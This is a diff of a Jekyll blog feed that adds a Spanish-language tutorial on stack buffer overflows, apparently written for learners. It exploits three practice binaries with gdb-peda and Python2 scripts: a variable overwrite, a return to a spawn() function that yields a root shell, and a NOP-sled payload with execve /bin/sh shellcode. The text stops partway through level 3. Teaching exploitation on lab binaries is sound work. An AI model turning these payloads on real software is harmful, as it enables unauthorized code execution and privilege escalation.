@@ -1,5 +1,738 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-30T20:13:02-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Scrambled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" rel="alternate" type="text/html" title="HackTheBox - Scrambled (medium)" /><published>2024-04-30T00:00:00-06:00</published><updated>2024-04-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T20:30:54-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">Buffer Overflow For Beginners and Ret2libc</title><link href="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" rel="alternate" type="text/html" title="Buffer Overflow For Beginners and Ret2libc" /><published>2024-05-03T00:00:00-06:00</published><updated>2024-05-03T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub/machines/2024/05/03/buffer</id><content type="html" xml:base="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"><![CDATA[<p align="center">
+<img src="/assets/vulnhub/buff/icon.png" />
+</p>
+
+<h2 id="level-one">Level One</h2>
+
+<blockquote>
+  <p>Comparación de caracteres.</p>
+</blockquote>
+
+<blockquote>
+  <p>Vamos a desactivar el ASRL temporalmente.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
+0
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Lo primero que vamos hacer es analizar el código que esta escrito en C.</p>
+  </li>
+  <li>
+    <p>Vemos que se esta definiendo un Buffer de tamaño 32 bytes, esta asignado una variable <code class="language-plaintext highlighter-rouge">long key</code> con valor <code class="language-plaintext highlighter-rouge">0x12345678</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/1.png" />
+</p>
+
+<ul>
+  <li>Esta es la parte interesante ya que vemos que si se igual el valor <code class="language-plaintext highlighter-rouge">key</code> a <code class="language-plaintext highlighter-rouge">0x42424242</code> se va ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es el objetivo en caso de que no sea ese valor no se hará nada.</li>
+</ul>
+
+<pre><code class="language-C">if(key == 0x42424242) {
+        execve("/bin/sh", 0, 0);
+    }
+    else {
+        printf("%s\n", "Sorry try again...");
+    }
+</code></pre>
+
+<ul>
+  <li>Para saber a cuanto equivale el valor <code class="language-plaintext highlighter-rouge">key</code> podemos hacerlo desde <code class="language-plaintext highlighter-rouge">bash</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">42"</span>
+B%
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Como sabemos que equivale ala letra <code class="language-plaintext highlighter-rouge">B</code> vemos que esta igualado a <code class="language-plaintext highlighter-rouge">4</code> <code class="language-plaintext highlighter-rouge">B</code> para poder obtener la <code class="language-plaintext highlighter-rouge">Bash</code> que necesitamos necesitamos enviar el tamaño del Buff que son <code class="language-plaintext highlighter-rouge">32 bytes</code> + las B para que la condición se true y se ejecute.</p>
+  </li>
+  <li>
+    <p>Vamos a crear un script rápido en <code class="language-plaintext highlighter-rouge">python</code> que haga todo lo que necesitamos.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
+
+first <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> 32 <span class="c"># le pasamos 32 veces A para el buffer</span>
+
+key <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c"># le pasamos las 4 B </span>
+
+print<span class="o">(</span>first + key<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Al cumplirse todas las condiciones nos debería de otorgar una <code class="language-plaintext highlighter-rouge">bash</code> como el usuario que esta corriendo el binario en este caso será mi usuario ya que yo lo estoy ejecutando.</p>
+  </li>
+  <li>
+    <p>Allí podemos ver los <code class="language-plaintext highlighter-rouge">prints</code> que se cumplen y por eso nos otorga la <code class="language-plaintext highlighter-rouge">bash</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelOne <span class="si">$(</span>python2 scriptOne.py<span class="si">)</span>
+Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Key is: 0x42424242
+<span class="nv">$ </span><span class="nb">whoami
+</span>miguel
+</code></pre></div></div>
+
+<h2 id="leveltwo">LevelTwo</h2>
+
+<blockquote>
+  <p>Llamada a la dirección de una función que te otorga una /bin/sh.</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Continuamos con el nivel 2 vamos a ver el código.</p>
+  </li>
+  <li>
+    <p>En este caso vemos que en el código se esta definiendo el <code class="language-plaintext highlighter-rouge">uid</code> al propietario del binario ósea <code class="language-plaintext highlighter-rouge">level2</code> ya que este es el segundo binario el <code class="language-plaintext highlighter-rouge">uid</code> funciona para almacenar identificadores de usuario, es el identificador de usuario en Linux y antes del return podemos ver que esta llamando a una función llamada <code class="language-plaintext highlighter-rouge">hello</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/2.png" />
+</p>
+
+<ul>
+  <li>En esta imagen vemos el código de la función <code class="language-plaintext highlighter-rouge">hello</code> que se esta usando en el código.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/3.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vemos que se define un tamaño de 28 bytes y usa <code class="language-plaintext highlighter-rouge">strcpy</code> que copea el argumento que le pasas.</p>
+  </li>
+  <li>
+    <p>Si inspeccionamos la funciona <code class="language-plaintext highlighter-rouge">spawn</code> tenemos que pasarle 3 argumentos para que nos de una <code class="language-plaintext highlighter-rouge">Bash</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/4.png" />
+</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">spawn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//privilegios de super usuario</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// Argumentos para /bin/sh</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// No se pasan variables de entorno</span>
+  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span> <span class="c1">// se interpreta la bash</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Para empezar vamos a usar <code class="language-plaintext highlighter-rouge">gdb</code> que es un <code class="language-plaintext highlighter-rouge">debugger</code> y lo usaremos junto con peda <a href="https://github.com/longld/peda">https://github.com/longld/peda</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelTwo
+Reading symbols from levelTwo...
+<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelTwo<span class="o">)</span>
+gdb-peda<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>En el código vimos que se esta definiendo que son 28 bytes de buffer a si que vamos a enviar 100 bytes para ver si se corrompe el binario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_arg 100
+Set 1 arguments to program
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo corremos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run
+Starting program: /home/miguel/StackOverflow/levels/levelTwo <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
+Hello AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+
+Program received signal SIGSEGV, Segmentation fault.
+Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
+
+Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0x6b <span class="o">(</span><span class="s1">'k'</span><span class="o">)</span>
+EBX: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
+ECX: 0xffffcf0c <span class="nt">--</span><span class="o">&gt;</span> 0x2e6b3000 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
+EDX: 0x1
+ESI: 0xffffcfe0 <span class="nt">--</span><span class="o">&gt;</span> 0x2
+EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+EBP: 0x41412941 <span class="o">(</span><span class="s1">'A)AA'</span><span class="o">)</span>
+ESP: 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+EIP: 0x61414145 <span class="o">(</span><span class="s1">'EAAa'</span><span class="o">)</span>
+EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x61414145
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+0004| 0xffffcf94 <span class="o">(</span><span class="s2">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+0008| 0xffffcf98 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+0012| 0xffffcf9c <span class="o">(</span><span class="s2">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+0016| 0xffffcfa0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+0020| 0xffffcfa4 <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+0024| 0xffffcfa8 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+0028| 0xffffcfac <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x61414145 <span class="k">in</span> ?? <span class="o">()</span>
+gdb-peda<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo que tenemos que hacer es buscar el <code class="language-plaintext highlighter-rouge">offset</code> que es un valor para determinar la posicion en la memoria que se va a sobrescribir para esto le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code> que es la dirección de memoria de la próxima instrucción a ejecutar, el objetivo es manipular el valor del registro <code class="language-plaintext highlighter-rouge">EIP</code> para que apunte a una dirección de memoria controlada por nosotros.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x61414145
+1631666501 found at offset: 36
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vimos que en el código hay una función <code class="language-plaintext highlighter-rouge">spawn</code> y necesitamos saber su dirección a si que vamos a buscarla.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info <span class="k">function</span> ^spawn<span class="err">$</span>
+All functions matching regular expression <span class="s2">"^spawn$"</span>:
+
+Non-debugging symbols:
+0x565561e9  spawn
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno ya tenemos la dirección pero como estamos en <code class="language-plaintext highlighter-rouge">little endian</code> tenemos que darle la vuelta ala dirección.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x565561e9      |    <span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>61<span class="se">\x</span>e9    | <span class="se">\x</span>e9<span class="se">\x</span>61<span class="se">\x</span>55<span class="se">\x</span>56
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora como ya tenemos todo listo podemos seguir con el script para que todo esto funcione.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptTwo.py
+<span class="c">#!/usr/bin/python2</span>
+
+offset <span class="o">=</span> 36 <span class="c"># pattern_offset 0x61414145</span>
+
+null <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset <span class="c"># vamos a pasarle eso para asta llegar al EIP</span>
+
+spawn <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56"</span> <span class="c"># Le pasamos la direccion para que el EIP apunte a ala funcion spawn</span>
+
+print<span class="o">(</span>null + spawn<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelTwo <span class="si">$(</span>python2 scriptTwo.py<span class="si">)</span>
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�UV
+<span class="c"># whoami</span>
+root
+<span class="c">#</span>
+</code></pre></div></div>
+
+<h2 id="level-3">Level 3</h2>
+
+<blockquote>
+  <p>Stack Based.</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Vamos a observar el código.</p>
+  </li>
+  <li>
+    <p>Después de analizar con <code class="language-plaintext highlighter-rouge">ghidra</code> esta es la funciona <code class="language-plaintext highlighter-rouge">main</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/main.png" />
+</p>
+
+<ul>
+  <li>Esta haciendo casi lo mismo pero ahora llama a la funciona <code class="language-plaintext highlighter-rouge">overflow</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/vulnhub/buff/main2.png" />
+</p>
+
+<ul>
+  <li>Ahora define un buffer de <code class="language-plaintext highlighter-rouge">260 bytes</code> y copea el argumento con la función <code class="language-plaintext highlighter-rouge">strcpy</code> que habíamos visto de antes en los binarios anterior, si <code class="language-plaintext highlighter-rouge">param_1</code> contiene más de <code class="language-plaintext highlighter-rouge">260</code> caracteres, los datos adicionales se escribirán en la memoria adyacente a <code class="language-plaintext highlighter-rouge">local_10c</code>, lo que puede provocar un desbordamiento de búfer.</li>
+</ul>
+
+<pre><code class="language-C">void overflow(char *param_1)
+
+{
+  char local_10c [260];
+  
+  strcpy(local_10c,param_1);
+  printf("Buf: %s\n",local_10c);
+  return;
+}
+</code></pre>
+
+<ul>
+  <li>Vamos a volver a usar <code class="language-plaintext highlighter-rouge">gdb</code> para corromper el binario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelThree
+Reading symbols from levelThree...
+<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelThree<span class="o">)</span>
+gdb-peda<span class="nv">$ </span>pattern_arg 300
+Set 1 arguments to program
+gdb-peda<span class="nv">$ </span>run
+Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
+Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+
+Program received signal SIGSEGV, Segmentation fault.
+Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
+
+Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0x132
+EBX: 0x25413225 <span class="o">(</span><span class="s1">'%2A%'</span><span class="o">)</span>
+ECX: 0xffffd0bc <span class="nt">--</span><span class="o">&gt;</span> 0x13ecbc00
+EDX: 0x1
+ESI: 0xffffd270 <span class="nt">--</span><span class="o">&gt;</span> 0x2
+EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+EBP: 0x64254148 <span class="o">(</span><span class="s1">'HA%d'</span><span class="o">)</span>
+ESP: 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
+EIP: 0x41332541 <span class="o">(</span><span class="s1">'A%3A'</span><span class="o">)</span>
+EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x41332541
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
+0004| 0xffffd224 <span class="o">(</span><span class="s2">"eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
+0008| 0xffffd228 <span class="o">(</span><span class="s2">"A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
+0012| 0xffffd22c <span class="o">(</span><span class="s2">"%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
+0016| 0xffffd230 <span class="o">(</span><span class="s2">"5A%KA%gA%6A%"</span><span class="o">)</span>
+0020| 0xffffd234 <span class="o">(</span><span class="s2">"A%gA%6A%"</span><span class="o">)</span>
+0024| 0xffffd238 <span class="o">(</span><span class="s2">"%6A%"</span><span class="o">)</span>
+0028| 0xffffd23c <span class="nt">--</span><span class="o">&gt;</span> 0x0
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41332541 <span class="k">in</span> ?? <span class="o">()</span>
+gdb-peda<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora buscamos el <code class="language-plaintext highlighter-rouge">offset</code> le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41332541
+1093870913 found at offset: 268
+</code></pre></div></div>
+
+<ul>
+  <li>Necesitamos 268 bytes para sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code> como no hay una función que nos otorgue una <code class="language-plaintext highlighter-rouge">bash</code> vamos a definir un <code class="language-plaintext highlighter-rouge">shellcode</code> podemos usar el siguiente <a href="https://www.exploit-db.com/shellcodes/13628">https://www.exploit-db.com/shellcodes/13628</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
+
+offset <span class="o">=</span> 268
+
+shellcode  <span class="o">=</span> b<span class="s2">""</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">NOP</code> que no realiza ninguna acción solo es para rellenar el espacio que falta en la memoria para permitir que el flujo del control del programa sea manipulado pero muy importante tenemos que restarle el tamaño del <code class="language-plaintext highlighter-rouge">shellcode</code> por que no podemos pasarnos de <code class="language-plaintext highlighter-rouge">268 bytes</code> para no sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptThree.py
+<span class="c">#!/usr/bin/python2</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+offset <span class="o">=</span> 268 <span class="c">#En el shellcode son las intrucciones maliciosas</span>
+
+shellcode  <span class="o">=</span> b<span class="s2">""</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span> <span class="c">#x90", representa la instrucción "NOP" en lenguaje de máquina</span>
+eip <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c">#eip contiene una secuencia de caracteres "B" repetidos 4 veces, lo que representa el valor que se escribirá en el registro EIP.</span>
+print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora para probar vamos con <code class="language-plaintext highlighter-rouge">gdb</code> pasando el <code class="language-plaintext highlighter-rouge">script</code> como argumento.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
+Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
+Buf: j
+      XRh//shh/bin��BBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
+
+Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
+Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0x116
+EBX: 0xe3896e69
+ECX: 0xffffd0dc <span class="nt">--</span><span class="o">&gt;</span> 0xe67ff500
+EDX: 0x1
+ESI: 0xffffd290 <span class="nt">--</span><span class="o">&gt;</span> 0x2
+EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
+EBP: 0x80cdc931
+ESP: 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
+EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
+EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x42424242
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
+0004| 0xffffd244 <span class="nt">--</span><span class="o">&gt;</span> 0x0
